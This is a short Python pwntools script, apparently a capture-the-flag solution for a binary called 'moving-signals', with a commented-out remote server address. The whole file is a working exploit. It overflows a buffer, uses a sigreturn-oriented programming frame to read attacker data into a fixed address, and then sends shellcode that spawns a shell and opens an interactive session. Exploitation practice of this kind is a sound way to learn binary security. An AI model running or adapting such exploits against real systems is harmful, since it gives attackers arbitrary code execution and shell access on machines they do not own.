from pwn import *
context.log_level = 'DEBUG'
context.arch = 'amd64'
sh = process('./moving-signals')
# sh = remote('185.172.165.118',2525)
gdb.attach(sh)
# pause()
sigframe = SigreturnFrame()

sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = 0x41100
sigframe.rdx = 0x400
sigframe.rsp = 0x41100
sigframe.rip = 0x41015
payload = 'a' * 8  + p64(0x41018) + p64(15) + p64(0x41015) + str(sigframe)
payload = payload.ljust(0x1F4,'a')
sh.send(payload)
sh.sendline(p64(0x41108) + asm(shellcraft.sh()))
sh.interactive()